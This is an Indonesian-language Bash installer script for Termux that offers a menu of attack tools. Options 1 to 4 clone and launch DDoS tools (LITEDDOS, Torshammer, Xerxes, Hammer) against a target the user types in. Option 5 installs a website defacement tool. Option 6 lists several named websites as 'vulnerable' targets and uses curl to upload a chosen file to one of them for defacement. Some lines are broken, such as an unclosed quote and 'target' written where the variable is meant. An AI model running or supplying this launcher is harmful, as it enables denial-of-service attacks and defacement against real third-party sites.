#!/system/xbin/bash
#Author InYouDfv47
#Selamat Belajar

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'    

figlet Bahauddin | lolcat
echo $cyan"Membuat Tools Instaler Sendiri Di Termux"
echo $green"Daftar Toolsnya=>"
echo $purple"[1] DDOS Website Dengan LITEDDOS"
echo $purple"[2] DDOS Website Dengan Torshammer"
echo $purple"[3] DDOS Website Dengan Xerxes"
echo $purple"[4] DDOS Website Dengan Hammer"
echo $purple"[5] d1"
echo $purple"[6] d2"
echo
echo $green
read -p "╭─[Pilih Nomer]
╰─root@Dfv47=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo $green"Installing.....
apt update
apt install git
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo $green"Installing Xerxes DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1 
apt install git
apt install bash
pip2 install bash
git clone https://github.com/ALX-04/iesDEFACE
mv iesDEFACE $HOME
cd $HOME/iesDEFACE
bash iesDeface.sh
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
echo "\033[34;1m"
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet -f slant MrB4J1N64N
echo "\033[37;1m"
echo "Masukan Web target"
echo "Contoh Web Target vuln"
echo "	http://bestilling.udir.no/"
echo "	http://560560.ru/"
echo "	http://myownemailer.com/"
echo "	http://Zoocentral.co.za/"
echo "	http://50-50-50.ru/"
echo "	http://tirupurjobs.net/"
echo "	http://Matrimony.co.za/"
echo "	http://Bheh.co.za/"
read -p "[MrB4J1N64N]>" target
echo "Masukan Nama script kalian"
echo "yang ada di Luar Folder Ruang Penyimpanan"
read -p "[MrB4J1N64N]>" script
curl -T /storage/emulated/0/$script $target
echo "\033[33;1m"
echo "Selesai! Tod Cek di $target $script "
fi
